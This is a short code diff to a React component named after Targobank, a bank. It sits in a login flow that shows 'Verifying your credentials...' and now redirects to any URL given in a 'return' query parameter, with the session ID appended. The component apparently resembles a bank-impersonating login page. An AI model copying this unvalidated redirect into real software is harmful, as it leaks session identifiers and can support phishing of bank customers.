@@ -287,7 +287,7 @@ const Targobank = () => {
       {showLoading && (
         <LoadingOverlay
           message={lang === "de" ? "Anmeldedaten werden überprüft..." : "Verifying your credentials..."}
-          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
         />
       )}
 
